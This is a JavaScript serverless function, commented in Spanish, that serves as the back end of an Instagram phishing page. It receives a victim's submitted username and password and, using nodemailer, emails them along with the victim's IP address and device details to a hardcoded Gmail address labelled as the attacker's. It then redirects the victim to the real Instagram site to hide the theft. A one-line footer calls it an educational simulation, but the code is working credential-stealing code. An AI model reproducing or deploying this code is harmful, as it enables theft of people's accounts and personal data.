const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Método no permitido' };
  }

  const { username, password } = JSON.parse(event.body);
  const attackerEmail = 'jvab5899@gmail.com'; // Email del atacante

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: attackerEmail,
      pass: process.env.EMAIL_PASS
    }
  });

  const mailOptions = {
    from: attackerEmail,
    to: attackerEmail,
    subject: '🎣 Credenciales capturadas de Instagram',
    html: `
      <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f9f9f9;">
        <h2 style="color: #333;">✅ Nuevas credenciales capturadas</h2>
        <div style="background-color: white; padding: 20px; border-radius: 5px; margin: 20px 0; border: 1px solid #eee;">
          <p><strong>📧 Correo/Usuario:</strong> ${username}</p>
          <p><strong>🔑 Contraseña:</strong> ${password}</p>
          <p><strong>📅 Fecha:</strong> ${new Date().toLocaleString()}</p>
          <p><strong>🌐 IP:</strong> ${event.headers['client-ip'] || 'localhost'}</p>
          <p><strong>📱 Dispositivo:</strong> ${event.headers['user-agent']}</p>
        </div>
        <p style="color: #666; font-size: 12px;">Simulación de phishing con fines educativos</p>
      </div>
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    return {
      statusCode: 200,
      body: JSON.stringify({ 
        message: 'success',
        redirectTo: 'https://www.instagram.com'
      })
    };
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Error al procesar la solicitud' })
    };
  }
}; 